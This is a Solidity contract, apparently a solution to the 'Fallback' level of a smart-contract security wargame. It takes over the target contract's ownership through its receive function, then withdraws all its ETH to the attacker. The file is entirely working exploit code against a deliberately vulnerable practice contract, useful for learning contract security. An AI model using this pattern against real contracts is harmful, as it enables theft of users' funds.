// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Fallback} from "../../src/2-fallback/Fallback.sol";

contract FallbackAttacker {
  Fallback fallbackContract;
  address public owner;

  constructor(address _fallbackContract) {
    fallbackContract = Fallback(payable(_fallbackContract));
    owner = msg.sender;
  }
  
  function attack() external payable{
    require(msg.value > 1);
    uint256 amount = msg.value - 1;

    // Contributing
    fallbackContract.contribute{value: amount}();
    
    // Sending eth
    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
    if(!success) revert();

    // Withdrawing all eth
    fallbackContract.withdraw();

    payable(owner).transfer(address(this).balance);
  }

  receive() external payable{}
}